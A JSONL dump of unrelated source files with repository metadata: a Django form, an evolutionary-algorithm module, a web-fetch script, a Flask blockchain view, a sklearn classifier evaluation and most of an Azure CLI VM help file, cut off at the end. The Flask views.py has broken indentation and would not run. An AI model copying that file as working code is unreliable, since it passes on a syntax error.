**kwargs)\n\t\tself.helper = FormHelper()\n\t\tself.helper.form_id = 'resetLinkForm'\n\t\tself.helper.form_method = 'post'\n\t\tself.helper.layout = Layout(\n\t\t\t\tPrependedText('email', \"<span class='glyphicon glyphicon-envelope'></span>\", placeholder=\"Email\", active=True),\n\t\t\t\tFormActions(\n\t\t\t\t\tSubmit('submit', 'Send Link', css_class ='btn btn-success btn-block'),\n\t\t\t\t\t),\n\t\t\t)\n"}
{"blob_id": "32409fe7d932b0f82a86871030a3e70d8e6e1acc", "directory_id": "8f6cc0e8bd15067f1d9161a4b178383e62377bc7", "path": "/evolutionary_algorithms/playground/fusion_V1001/procedure.py", "content_id": "fde6017dbb421b32ef689007b42182c302416ab6", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "humorbeing/python_github", "snapshot_id": "9c4dfc61a3cefbb266fefff335f6b28d05797e5e", "revision_id": "e4b4b49bee7e7e3843c6874717779ce8d619bd02", "branch_name": "refs/heads/master", "visit_date": "2023-01-22 21:51:20.193131", "revision_date": "2020-01-26 21:47:23", "committer_date": "2020-01-26 21:47:23", "github_id": "163707778", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2022-12-27 15:37:48", "gha_created_at": "2019-01-01 01:58:18", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1332", "extension": "py", "content": "import numpy as np\nfrom crossover import *\nfrom mutation import *\nfrom tools import *\n\n\ndef objective_function(point_in):\n    x_in = point_in[0]\n    y_in = point_in[1]\n    return (((x_in + 50) ** 2 + (y_in + 15) ** 2) / 4000) - (np.cos(x_in / 4) * np.cos(y_in / 4)) + 1\n\n\ndef initialize(mu_in, boundary_in):\n    x_new_generation = np.random.uniform(size=mu_in)\n    x_new_generation = x_new_generation * (boundary_in[1] - boundary_in[0]) + boundary_in[0]\n    y_new_generation = np.random.uniform(size=mu_in)\n    y_new_generation = y_new_generation * (boundary_in[3] - boundary_in[2]) + boundary_in[2]\n    new_gen = np.array([x_new_generation, y_new_generation])\n    return new_gen.T\n\n\ndef operate(gen_in, mu_in, lamb_da_in, boundary_in):\n    lambda_gen = crossover_UNDX(gen_in, mu_in, lamb_da_in)\n    lambda_gen = mutation_normal(lambda_gen)\n    return reflect_fix(lambda_gen, boundary_in)\n\n\ndef nominate(gen_in, lambda_gen_in):\n    cand = np.concatenate((gen_in, lambda_gen_in))\n    return cand\n\n\ndef evaluate(cand_in):\n    fit = []\n    for i in cand_in:\n        f = objective_function(i)\n        fit.append(f)\n    return np.array(fit)\n\n\ndef select(cand_in, fit_in, mu_in):\n    ind = np.argpartition(fit_in, -1 * mu_in)[-1 * mu_in:]\n    new_gen = []\n    for i in ind:\n        new_gen.append(cand_in[i])\n    return np.array(new_gen)\n"}
{"blob_id": "1868c4f462125c178df306390bdc9bddd635f954", "directory_id": "74293a278c1413a265a03c265069354c77941b63", "path": "/web/web_requests_01.py", "content_id": "1c3c37aa4391beacec9d6f90e5547c3ec5cde9bd", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "itenabler-python/PythonDay2", "snapshot_id": "8ae5e5c01f270a5759f27e09caf7fb96c3add085", "revision_id": "13070a2959096732a25ebf82c60d6e8811f33945", "branch_name": "refs/heads/master", "visit_date": "2021-04-01 05:51:46.698935", "revision_date": "2020-03-20 06:58:58", "committer_date": "2020-03-20 06:58:58", "github_id": "248161022", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "116", "extension": "py", "content": "import requests\n\nurl = \"https://www.fortytwo.sg/furniture/dining-kitchen\"\nreq = requests.get(url)\nprint(req.text)\n\n\n"}
{"blob_id": "4a540df5826547185e3edbd8fe66ee5ecf3d1f7c", "directory_id": "1679de8742215727f808bccd33fd381bd8f4897e", "path": "/views.py", "content_id": "e2dd73bf2232fe9d6e97bc90cb74abe9d382b094", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "rajputrohitrjit/Suppy_Chain_blockchain", "snapshot_id": "2adf0e06c3ec22e8ed2ff4e78906bce20245ac99", "revision_id": "68855fa340ac8331e814a5b47361feace7ed663c", "branch_name": "refs/heads/main", "visit_date": "2023-03-13 23:48:11.333872", "revision_date": "2021-02-28 13:46:34", "committer_date": "2021-02-28 13:46:34", "github_id": "337650515", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1156", "extension": "py", "content": "import datetime\nimport json\nimport pymysql.cursors\nimport requests\nfrom flask import render_template, redirect, request\nfrom app import app\nCONNECTED_NODE_ADDRESS = \"http://127.0.0.1:8000\"\nposts = []\ndef fetch_posts():\n    get_chain_address = \"{}/chain\".format(CONNECTED_NODE_ADDRESS)\n    response = requests.get(get_chain_address)\n    if response.status_code == 200:\n        content = []\n        chain = json.loads(response.content)\n        for block in chain[\"chain\"]:\n            for tx in block[\"trans\"]:\n                tx[\"index\"] = block[\"index\"]\n                tx[\"hash\"] = block[\"prev_hash\"]\n                content.append(tx)\n global posts\n        posts = sorted(content, key=lambda k: k['timestamp'],\n                       reverse=True)\n@app.route('/')\ndef index():\n    fetch_posts()\nreturn render_template('login.html',\n                           title='WELCOME !',\n                           posts=posts,\n                           node_address=CONNECTED_NODE_ADDRESS,\n                           readable_time=timestamp_to_string)\ndef timestamp_to_string(epoch_time):\n    return datetime.datetime.fromtimestamp(epoch_time).strftime('%H:%M')\n"}
{"blob_id": "d267cda201e75ae0ae836f30770ba36ddf36f410", "directory_id": "ed61a9e290214914f973865e99bb1e95acc4872a", "path": "/CHDNet-tongue/classifier/CART_10rounds.py", "content_id": "fd26af9102c09481ba0dedb342002d4dcde9fa1f", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "danmeng90/CHDNet-tongue", "snapshot_id": "ec5d972f760f366a8b51bc2a365ea1a7c3620ed6", "revision_id": "55e0609150bcc3daa090d5a9c78807b52f8a5ec4", "branch_name": "refs/heads/master", "visit_date": "2021-04-29 01:16:15.444902", "revision_date": "2017-01-01 16:16:37", "committer_date": "2017-01-01 16:16:37", "github_id": "77783777", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "4034", "extension": "py", "content": "#coding=utf-8\r\nfrom __future__ import division\r\nimport numpy as np\r\nfrom sklearn.ensemble import GradientBoostingClassifier\r\nfrom sklearn.cross_validation import StratifiedKFold\r\nfrom sklearn import svm\r\nfrom sklearn.neighbors.nearest_centroid import NearestCentroid\r\nfrom sklearn.neighbors import KNeighborsClassifier\r\nfrom sklearn import metrics\r\nfrom sklearn import tree\r\nfrom sklearn.ensemble import RandomForestClassifier\r\nimport random\r\nimport math\r\nfrom sklearn.metrics import roc_curve\r\nimport time\r\n\r\nX = np.genfromtxt('../CHDNet_tongue/feature_random.csv', delimiter=',')\r\ny = np.genfromtxt('../CHDNet_tongue/label_random.csv', delimiter=',')\r\n\r\n#================================================\r\n\r\n#=================================================\r\n\r\ndef evulate(ytest,pred):\r\n    TP = 0\r\n    FN = 0\r\n    FP = 0\r\n    TN = 0\r\n    for i in range(len(ytest)):\r\n        if pred[i]>0.5:\r\n            pred[i] = 1\r\n        else:\r\n            pred[i] = 0\r\n    for i in range(len(ytest)):\r\n        if ytest[i]==1 and pred[i]==1:\r\n            TP = TP + 1\r\n        elif ytest[i]==1 and pred[i]==0:\r\n            FN = FN + 1\r\n        elif ytest[i]==0 and pred[i]==1:\r\n            FP  = FP + 1\r\n        else:\r\n            TN = TN + 1\r\n    return TP,FN,FP,TN\r\ndef assement(TP,FN,FP,TN):\r\n    correct_rate = (TP + TN)/(TP + FN + FP + TN)\r\n    sensitivity = TP/(TP+FN)\r\n    specificity = TN/(FP+TN)\r\n    ppv = TP/(TP+FP)\r\n    if TN + FN == 0:\r\n        npv = 0\r\n    else:\r\n        npv = TN/(TN+FN)\r\n\r\n    F1_score = 2*TP/(2*TP+FP+FN)\r\n    return correct_rate,sensitivity,specificity,ppv,npv,F1_score\r\n\r\nCR = []\r\nSE = []\r\nSP = []\r\nT = []\r\nF1 = []\r\nPPV = []\r\nNPV = []\r\n\r\nfor j in range(0,10):\r\n\r\n    total_correct_rate = 0\r\n    total_sensitivity = 0\r\n    total_specificity = 0\r\n    total_F1_score = 0\r\n    total_time = 0\r\n    total_ppv = 0\r\n    total_npv = 0\r\n\r\n    skf = StratifiedKFold(y, 5, shuffle= True)\r\n    for train_index, test_index in skf:\r\n        start_time = time.time()\r\n        train_data = X[train_index];train_y = y[train_index]\r\n        test_data = X[test_index];test_y = y[test_index]\r\n        clf = tree.DecisionTreeClassifier()\r\n        clf.fit(train_data, train_y)\r\n        pred = clf.predict(test_data)\r\n        TP, FN, FP, TN = evulate(test_y, pred)\r\n        # print TP,FN,FP,TN\r\n        correct_rate, sensitivity, specificity, ppv, npv, F1_score = assement(TP, FN, FP, TN)\r\n        end_time = time.time()\r\n        # print \"correct_rate\",correct_rate\r\n        # print \"sensitivity\",sensitivity\r\n        # print \"specificity\",specificity\r\n        # print \"F1_score:\",F1_score\r\n        # print \"runing time:\",end_time-start_time\r\n        total_correct_rate = total_correct_rate + correct_rate\r\n        total_sensitivity = total_sensitivity + sensitivity\r\n        total_specificity = total_specificity + specificity\r\n        total_F1_score = total_F1_score + F1_score\r\n        total_ppv = total_ppv + ppv\r\n        total_npv = total_npv + npv\r\n        total_time = total_time + end_time - start_time\r\n\r\n        # print \"avgCorrect\",total_correct_rate/5\r\n        # print \"avgSensitivity\",total_sensitivity/5\r\n        # print \"avgSpecificity\",total_specificity/5\r\n        # print \"avgF1_score\",total_F1_score/5\r\n        # print \"avgPPV------------------>\",total_ppv/5\r\n        # print \"avgNPV-------------------->\",total_NPV/5\r\n        # print \"avgRuning time\",total_time/5\r\n\r\n    CR.append(total_correct_rate / 5)\r\n    SE.append(total_sensitivity / 5)\r\n    SP.append(total_specificity / 5)\r\n    T.append(total_time / 5)\r\n    F1.append(total_F1_score / 5)\r\n    PPV.append(total_ppv / 5)\r\n    NPV.append(total_npv / 5)\r\n\r\nimport numpy as np\r\n\r\nprint 'CR',np.mean(CR)\r\nprint 'SE', np.mean(SE)\r\nprint 'SP', np.mean(SP)\r\nprint 'PPV',np.mean(PPV)\r\nprint 'NPV',np.mean(NPV)\r\nprint 'F1',np.mean(F1)\r\n# print 'T',np.mean(T)\r\n\r\n# print 'CR_VAR',np.var(CR)\r\n# print 'SE_VAR',np.var(SE)\r\n# print 'SP_VAR',np.var(SP)\r\n# print 'F1_VAR',np.var(F1)\r\n# print 'T_VAR',np.var(T)\r\n# print 'PPV_VAR',np.var(PPV)\r\n# print 'NPV_VAR',np.var(NPV)\r\n"}
{"blob_id": "6dc8fb1166596c4ec3545010fcc5177f64c62587", "directory_id": "1f52a5488de9612425639c25de9c149f4b0919de", "path": "/src/command_modules/azure-cli-vm/azure/cli/command_modules/vm/_help.py", "content_id": "2814cff5055e56ff794e9d672a2108cfb3a93b73", "detected_licenses": "['MIT', 'LicenseRef-scancode-unknown-license-reference']", "license_type": "permissive", "repo_name": "chaudum/azure-cli", "snapshot_id": "5f2c9da0632bd249e671e85ad86634ccc5098dcf", "revision_id": "a97d50eb9a5e99f10f0e6e8873e0d45651ea6161", "branch_name": "refs/heads/dev", "visit_date": "2020-04-15 17:59:33.241522", "revision_date": "2019-01-08 22:26:39", "committer_date": "2019-01-08 22:26:39", "github_id": "164895548", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "NOASSERTION", "gha_event_created_at": "2019-01-09 16:12:31", "gha_created_at": "2019-01-09 16:11:41", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "65230", "extension": "py", "content": "# coding=utf-8\n# --------------------------------------------------------------------------------------------\n# Copyright (c) Microsoft Corporation. All rights reserved.\n# Licensed under the MIT License. See License.txt in the project root for license information.\n# --------------------------------------------------------------------------------------------\n\n# pylint: disable=line-too-long, too-many-lines\n\nfrom knack.help_files import helps\n\nvm_ids_example = \"\"\"        - name: {0}\n          text: >\n            az {1} --ids $(az vm list -g MyResourceGroup --query \"[].id\" -o tsv)\n\"\"\"\n\nhelps['vm secret'] = \"\"\"\n    type: group\n    short-summary: Manage VM secrets.\n\"\"\"\n\nhelps['vm secret add'] = \"\"\"\n    type: command\n    short-summary: Add a secret to a VM.\n\"\"\"\n\nhelps['vm secret list'] = \"\"\"\n    type: command\n    short-summary: List secrets on a VM.\n\"\"\"\n\nhelps['vm secret remove'] = \"\"\"\n    type: command\n    short-summary: Remove a secret from a VM.\n\"\"\"\n\nhelps['vm secret format'] = \"\"\"\n    type: command\n    short-summary: Transform secrets into a form that can be used by VMs and VMSSes.\n    parameters:\n        - name: --secrets -s\n          long-summary: >\n            The command will attempt to resolve the vault ID for each secret. If it is unable to do so,\n            specify the vault ID to use for *all* secrets using: --keyvault NAME --resource-group NAME | --keyvault ID.\n    examples:\n        - name: Create a self-signed certificate with the default policy, and add it to a virtual machine.\n          text: >\n            az keyvault certificate create --vault-name vaultname -n cert1 \\\\\n              -p \"$(az keyvault certificate get-default-policy)\"\n\n            secrets=$(az keyvault secret list-versions --vault-name vaultname \\\\\n              -n cert1 --query \"[?attributes.enabled].id\" -o tsv)\n\n            vm_secrets=$(az vm secret format -s \"$secrets\")\n\n            az vm create -g group-name -n vm-name --admin-username deploy  \\\\\n              --image debian --secrets \"$vm_secrets\"\n\"\"\"\n\nhelps['vm create'] = \"\"\"\n    type: command\n    short-summary: Create an Azure Virtual Machine.\n    long-summary: 'For an end-to-end tutorial, see https://docs.microsoft.com/azure/virtual-machines/virtual-machines-linux-quick-create-cli.'\n    parameters:\n        - name: --image\n          type: string\n          short-summary: >\n            The name of the operating system image as a URN alias, URN, custom image name or ID, or VHD blob URI.\n            This parameter is required unless using `--attach-os-disk.` Valid URN format: \"Publisher:Offer:Sku:Version\".\n          populator-commands:\n          - az vm image list\n          - az vm image show\n        - name: --ssh-key-value\n          short-summary: The SSH public key or public key file path.\n    examples:\n        - name: Create a default Ubuntu VM with automatic SSH authentication.\n          text: >\n            az vm create -n MyVm -g MyResourceGroup --image UbuntuLTS\n        - name: Create a default RedHat VM with automatic SSH authentication using an image URN.\n          text: >\n            az vm create -n MyVm -g MyResourceGroup --image RedHat:RHEL:7-RAW:7.4.2018010506\n        - name: Create a default Windows Server VM with a private IP address.\n          text: >\n            az vm create -n MyVm -g MyResourceGroup --public-ip-address \"\" --image Win2012R2Datacenter\n        - name: Create a VM from a custom managed image.\n          text: >\n            az vm create -g MyResourceGroup -n MyVm --image MyImage\n        - name: Create a VM by attaching to a managed operating system disk.\n          text: >\n            az vm create -g MyResourceGroup -n MyVm --attach-os-disk MyOsDisk --os-type linux\n        - name: 'Create an Ubuntu Linux VM using a cloud-init script for configuration. See: https://docs.microsoft.com/azure/virtual-machines/virtual-machines-linux-using-cloud-init.'\n          text: >\n            az vm create -g MyResourceGroup -n MyVm --image debian --custom-data MyCloudInitScript.yml\n        - name: Create a Debian VM with SSH key authentication and a public DNS entry, located on an existing virtual network and availability set.\n          text: |\n            az vm create -n MyVm -g MyResourceGroup --image debian --vnet-name MyVnet --subnet subnet1 \\\\\n                --availability-set MyAvailabilitySet --public-ip-address-dns-name MyUniqueDnsName \\\\\n                --ssh-key-value @key-file\n        - name: Create a simple Ubuntu Linux VM with a public IP address, DNS entry, two data disks (10GB and 20GB), and then generate ssh key pairs.\n          text: |\n            az vm create -n MyVm -g MyResourceGroup --public-ip-address-dns-name MyUniqueDnsName \\\\\n                --image ubuntults --data-disk-sizes-gb 10 20 --size Standard_DS2_v2 \\\\\n                --generate-ssh-keys\n        - name: Create a Debian VM using Key Vault secrets.\n          text: >\n            az keyvault certificate create --vault-name vaultname -n cert1 \\\\\n              -p \"$(az keyvault certificate get-default-policy)\"\n\n            secrets=$(az keyvault secret list-versions --vault-name vaultname \\\\\n              -n cert1 --query \"[?attributes.enabled].id\" -o tsv)\n\n            vm_secrets=$(az vm secret format -s \"$secrets\") \\n\n\n            az vm create -g group-name -n vm-name --admin-username deploy  \\\\\n              --image debian --secrets \"$vm_secrets\"\n        - name: Create a CentOS VM with a system assigned identity. The VM will have a 'Contributor' role with access to a storage account.\n          text: >\n             az vm create -n MyVm -g rg1 --image centos --assign-identity --scope /subscriptions/99999999-1bf0-4dda-aec3-cb9272f09590/MyResourceGroup/myRG/providers/Microsoft.Storage/storageAccounts/storage1\n        - name: Create a debian VM with a user assigned identity.\n          text: >\n             az vm create -n MyVm -g rg1 --image debian --assign-identity  /subscriptions/99999999-1bf0-4dda-aec3-cb9272f09590/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID\n        - name: Create a debian VM with both system and user assigned identity.\n          text: >\n             az vm create -n MyVm -g rg1 --image debian --assign-identity  [system] /subscriptions/99999999-1bf0-4dda-aec3-cb9272f09590/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID\n        - name: Create a VM in an availability zone in the current resource group's region\n          min_profile: latest\n          text: >\n             az vm create -n MyVm -g MyResourceGroup --image Centos --zone 1\n\"\"\"\n\nhelps['vmss create'] = \"\"\"\n    type: command\n    short-summary: Create an Azure Virtual Machine Scale Set.\n    long-summary: 'For an end-to-end tutorial, see https://docs.microsoft.com/azure/virtual-machine-scale-sets/virtual-machine-scale-sets-linux-create-cli.'\n    parameters:\n        - name: --image\n          type: string\n          short-summary: >\n            The name of the operating system image as a URN alias, URN, custom image name or ID, or VHD blob URI.\n            Valid URN format: \"Publisher:Offer:Sku:Version\".\n          populator-commands:\n          - az vm image list\n          - az vm image show\n    examples:\n        - name: Create a Windows VM scale set with 5 instances, a load balancer, a public IP address, and a 2GB data disk.\n          text: >\n            az vmss create -n MyVmss -g MyResourceGroup --instance-count 5 --image Win2016Datacenter --data-disk-sizes-gb 2\n        - name: Create a Linux VM scale set with an auto-generated ssh key pair, a public IP address, a DNS entry, an existing load balancer, and an existing virtual network.\n          text: |\n            az vmss create -n MyVmss -g MyResourceGroup --public-ip-address-dns-name my-globally-dns-name \\\\\n                --load-balancer MyLoadBalancer --vnet-name MyVnet --subnet MySubnet --image UbuntuLTS \\\\\n                --generate-ssh-keys\n        - name: Create a Linux VM scale set from a custom image using the default existing public SSH key.\n          text: >\n            az vmss create -n MyVmss -g MyResourceGroup --image MyImage\n        - name: Create a Linux VM scale set with a load balancer and custom DNS servers. Each VM has a public-ip address and a custom domain name.\n          text: >\n            az vmss create -n MyVmss -g MyResourceGroup --image centos \\\\\n                --public-ip-per-vm --vm-domain-name myvmss --dns-servers 10.0.0.6 10.0.0.5\n        - name: 'Create a Linux VM scale set using a cloud-init script for configuration. See: https://docs.microsoft.com/azure/virtual-machines/virtual-machines-linux-using-cloud-init'\n          text: >\n            az vmss create -g MyResourceGroup -n MyVmss --image debian --custom-data MyCloudInitScript.yml\n        - name: Create a Debian VM scaleset using Key Vault secrets.\n          text: >\n            az keyvault certificate create --vault-name vaultname -n cert1 \\\\\n              -p \"$(az keyvault certificate get-default-policy)\"\n\n            secrets=$(az keyvault secret list-versions --vault-name vaultname \\\\\n              -n cert1 --query \"[?attributes.enabled].id\" -o tsv)\n\n            vm_secrets=$(az vm secret format -s \"$secrets\") \\n\n\n            az vmss create -g group-name -n vm-name --admin-username deploy  \\\\\n              --image debian --secrets \"$vm_secrets\"\n        - name: Create a VM scaleset with system assigned identity. The VM will have a 'Contributor' Role with access to a storage account.\n          text: >\n             az vmss create -n MyVmss -g MyResourceGroup --image centos --assign-identity --scope /subscriptions/99999999-1bf0-4dda-aec3-cb9272f09590/MyResourceGroup/myRG/providers/Microsoft.Storage/storageAccounts/storage1\n        - name: Create a debian VM scaleset with a user assigned identity.\n          text: >\n             az vmss create -n MyVmss -g rg1 --image debian --assign-identity  /subscriptions/99999999-1bf0-4dda-aec3-cb9272f09590/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID\n        - name: Create a debian VM scaleset with both system and user assigned identity.\n          text: >\n             az vmss create -n MyVmss -g rg1 --image debian --assign-identity  [system] /subscriptions/99999999-1bf0-4dda-aec3-cb9272f09590/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID\n        - name: Create a single zone VM scaleset in the current resource group's region\n          min_profile: latest\n          text: >\n             az vmss create -n MyVmss -g MyResourceGroup --image Centos --zones 1\n\"\"\"\n\nhelps['vm availability-set create'] = \"\"\"\n    type: command\n    short-summary: Create an Azure Availability Set.\n    long-summary: 'For more information, see https://docs.microsoft.com/azure/virtual-machines/virtual-machines-linux-manage-availability.'\n    examples:\n        - name: Create an availability set.\n          text: az vm availability-set create -n MyAvSet -g MyResourceGroup --platform-fault-domain-count 2 --platform-update-domain-count 2\n\"\"\"\n\nhelps['vm availability-set update'] = \"\"\"\n    type: command\n    short-summary: Update an Azure Availability Set.\n    examples:\n        - name: Update an availability set.\n          text: az vm availability-set update -n MyAvSet -g MyResourceGroup\n        - name: Update an availability set tag.\n          text: az vm availability-set update -n MyAvSet -g MyResourceGroup --set tags.foo=value\n        - name: Remove an availability set tag.\n          text: az vm availability-set update -n MyAvSet -g MyResourceGroup --remove tags.foo\n\"\"\"\n\nhelps['vm availability-set convert'] = \"\"\"\n    type: command\n    short-summary: Convert an Azure Availability Set to contain VMs with managed disks.\n    examples:\n        - name: Convert an availabiity set to use managed disks by name.\n          text: az vm availability-set convert -g MyResourceGroup -n MyAvSet\n        - name: Convert an availability set to use managed disks by ID.\n          text: >\n            az vm availability-set convert --ids $(az vm availability-set list -g MyResourceGroup --query \"[].id\" -o tsv)\n\"\"\"\n\nhelps['vm extension set'] = \"\"\"\n    type: command\n    short-summary: Set extensions for a VM.\n    long-summary: Get extension details from `az vm extension image list`.\n    examples:\n        - name: Add a user account to a Linux VM.\n          text: |\n            az vm extension set -n VMAccessForLinux --publisher Microsoft.OSTCExtensions --version 1.4 \\\\\n                --vm-name MyVm --resource-group MyResourceGroup \\\\\n                --protected-settings '{\"username\":\"user1\", \"ssh_key\":\"ssh_rsa ...\"}'\n    parameters:\n    - name: --name -n\n      populator-commands:\n      - az vm extension image list\n\"\"\"\n\nhelps['vm extension wait'] = \"\"\"\n    type: command\n    short-summary: Place the CLI in a waiting state until a condition of a virtual machine extension is met.\n\"\"\"\n\nhelps['vm availability-set delete'] = \"\"\"\n    type: command\n    short-summary: Delete an availability set.\n    examples:\n        - name: Delete an availability set.\n          text: az vm availability-set delete -n MyAvSet -g MyResourceGroup\n\"\"\"\n\nhelps['vm availability-set list'] = \"\"\"\n    type: command\n    short-summary: List availability sets.\n    examples:\n        - name: List availability sets.\n          text: az vm availability-set list -g MyResourceGroup\n\"\"\"\n\nhelps['vm availability-set list-sizes'] = \"\"\"\n    type: command\n    short-summary: List VM sizes for an availability set.\n    examples:\n        - name: List VM sizes for an availability set.\n          text: az vm availability-set list-sizes -n MyAvSet -g MyResourceGroup\n\"\"\"\n\nhelps['vm availability-set show'] = \"\"\"\n    type: command\n    short-summary: Get information for an availability set.\n    examples:\n        - name: Get information about an availability set.\n          text: az vm availability-set show -n MyAvSet -g MyResourceGroup\n\"\"\"\n\nhelps['vm update'] = \"\"\"\n    type: command\n    short-summary: Update the properties of a VM.\n    long-summary: Update VM objects and properties using paths that correspond to 'az vm show'.\n    examples:\n        - name: Add or update a tag.\n          text: az vm update -n name -g group --set tags.tagName=tagValue\n        - name: Remove a tag.\n          text: az vm update -n name -g group --remove tags.tagName\n        - name: Set the primary NIC of a VM.\n          text: az vm update -n name -g group --set networkProfile.networkInterfaces[1].primary=false networkProfile.networkInterfaces[0].primary=true\n        - name: Add a new non-primary NIC to a VM.\n          text: az vm update -n name -g group --add networkProfile.networkInterfaces primary=false id=<NIC_ID>\n        - name: Remove the fourth NIC from a VM.\n          text: az vm update -n name -g group --remove networkProfile.networkInterfaces 3\n\"\"\"\n\nhelps['vmss deallocate'] = \"\"\"\n    type: command\n    short-summary: Deallocate VMs within a VMSS.\n\"\"\"\n\nhelps['vmss delete-instances'] = \"\"\"\n    type: command\n    short-summary: Delete VMs within a VMSS.\n\"\"\"\n\nhelps['vmss get-instance-view'] = \"\"\"\n    type: command\n    short-summary: View an instance of a VMSS.\n    parameters:\n        - name: --instance-id\n          short-summary: A VM instance ID or \"*\" to list instance view for all VMs in a scale set.\n\n\"\"\"\n\nhelps['vmss list'] = \"\"\"\n    type: command\n    short-summary: List VMSS.\n\"\"\"\n\nhelps['vmss reimage'] = \"\"\"\n    type: command\n    short-summary: Reimage VMs within a VMSS.\n    parameters:\n        - name: --instance-id\n          short-summary: VM instance ID. If missing, reimage all instances.\n\"\"\"\n\nhelps['vmss restart'] = \"\"\"\n    type: command\n    short-summary: Restart VMs within a VMSS.\n\"\"\"\n\nhelps['vmss scale'] = \"\"\"\n    type: command\n    short-summary: Change the number of VMs within a VMSS.\n    parameters:\n        - name: --new-capacity\n          short-summary: Number of VMs in the VMSS.\n\"\"\"\n\nhelps['vmss show'] = \"\"\"\n    type: command\n    short-summary: Get details on VMs within a VMSS.\n    parameters:\n        - name: --instance-id\n          short-summary: VM instance ID. If missing, show the VMSS.\n\"\"\"\n\nhelps['vmss start'] = \"\"\"\n    type: command\n    short-summary: Start VMs within a VMSS.\n\"\"\"\n\nhelps['vmss stop'] = \"\"\"\n    type: command\n    short-summary: Power off (stop) VMs within a VMSS.\n    long-summary: The VMs will continue to be billed. To avoid this, you can deallocate VM instances within a VMSS through \"az vmss deallocate\"\n\"\"\"\n\nhelps['vmss update'] = \"\"\"\n    type: command\n    short-summary: Update a VMSS.\n\"\"\"\n\nhelps['vmss update-instances'] = \"\"\"\n    type: command\n    short-summary: Upgrade VMs within a VMSS.\n\"\"\"\n\nhelps['vmss wait'] = \"\"\"\n    type: command\n    short-summary: Place the CLI in a waiting state until a condition of a scale set is met.\n\"\"\"\n\nhelps['vmss disk'] = \"\"\"\n    type: group\n    short-summary: Manage data disks of a VMSS.\n\"\"\"\n\nhelps['vmss disk attach'] = \"\"\"\n    type: command\n    short-summary: Attach managed data disks to a scale set or its instances.\n\"\"\"\n\nhelps['vmss disk detach'] = \"\"\"\n    type: command\n    short-summary: Detach managed data disks from a scale set or its instances.\n\"\"\"\n\nhelps['vmss nic'] = \"\"\"\n    type: group\n    short-summary: Manage network interfaces of a VMSS.\n\"\"\"\n\nhelps['vmss rolling-upgrade'] = \"\"\"\n    type: group\n    short-summary: (PREVIEW) Manage rolling upgrades.\n\"\"\"\n\nhelps['vm convert'] = \"\"\"\n    type: command\n    short-summary: Convert a VM with unmanaged disks to use managed disks.\n    examples:\n        - name: Convert a VM with unmanaged disks to use managed disks.\n          text: az vm convert -g MyResourceGroup -n MyVm\n{0}\n\"\"\".format(vm_ids_example.format('Convert all VMs with unmanaged disks in a resource group to use managed disks.', 'vm convert'))\n\nhelps['vm'] = \"\"\"\n    type: group\n    short-summary: Manage Linux or Windows virtual machines.\n\"\"\"\nhelps['vm user'] = \"\"\"\n    type: group\n    short-summary: Manage user accounts for a VM.\n\"\"\"\n\nhelps['vm user delete'] = \"\"\"\n    type: command\n    short-summary: Delete a user account from a VM.\n    examples:\n        - name: Delete a user account.\n          text: az vm user delete -u username -n MyVm -g MyResourceGroup\n{0}\n\"\"\".format(vm_ids_example.format('Delete a user on all VMs in a resource group.', 'az vm user delete -u username'))\n\nhelps['vm user reset-ssh'] = \"\"\"\n    type: command\n    short-summary: Reset the SSH configuration on a VM.\n    long-summary: >\n        The extension will restart the SSH service, open the SSH port on your VM, and reset the SSH configuration to default values. The user account (name, password, and SSH keys) are not changed.\n    examples:\n        - name: Reset the SSH configuration.\n          text: az vm user reset-ssh -n MyVm -g MyResourceGroup\n{0}\n\"\"\".format(vm_ids_example.format(\"Reset the SSH server on all VMs in a resource group.\", 'vm user reset-ssh'))\n\nhelps['vm user update'] = \"\"\"\n    type: command\n    short-summary: Update a user account.\n    parameters:\n        - name: --ssh-key-value\n          short-summary: SSH public key file value or public key file path\n    examples:\n        - name: Update a Windows user account.\n          text: az vm user update -u username -p password -n MyVm -g MyResourceGroup\n        - name: Update a Linux user account.\n          text: az vm user update -u username --ssh-key-value \"$(< ~/.ssh/id_rsa.pub)\" -n MyVm -g MyResourceGroup\n{0}\n\"\"\".format(vm_ids_example.format('Update a user on all VMs in a resource group.',\n                                 'vm user update -u username --ssh-key-value \"$(< ~/.ssh/id_rsa.pub)\"'))\n\nhelps['vm availability-set'] = \"\"\"\n    type: group\n    short-summary: Group resources into availability sets.\n    long-summary: >\n        To provide redundancy to an application, it is recommended to group two or more virtual machines in an availability set.\n        This configuration ensures that during either a planned or unplanned maintenance event, at least one virtual machine\n        will be available.\n\"\"\"\n\nhelps['vm boot-diagnostics'] = \"\"\"\n    type: group\n    short-summary: Troubleshoot the startup of an Azure Virtual Machine.\n    long-summary: Use this feature to troubleshoot boot failures for custom or platform images.\n\"\"\"\n\nvm_boot_diagnostics_disable = 'vm boot-diagnostics disable'\nhelps[vm_boot_diagnostics_disable] = \"\"\"\n    type: command\n    short-summary: Disable the boot diagnostics on a VM.\n    examples:\n{0}\n\"\"\".format(vm_ids_example.format('Disable boot diagnostics on all VMs in a resource group.', vm_boot_diagnostics_disable))\n\nvm_boot_diagnostics_enable = 'vm boot-diagnostics enable'\nvm_boot_diagnostics_enable_cmd = \"{0} --storage 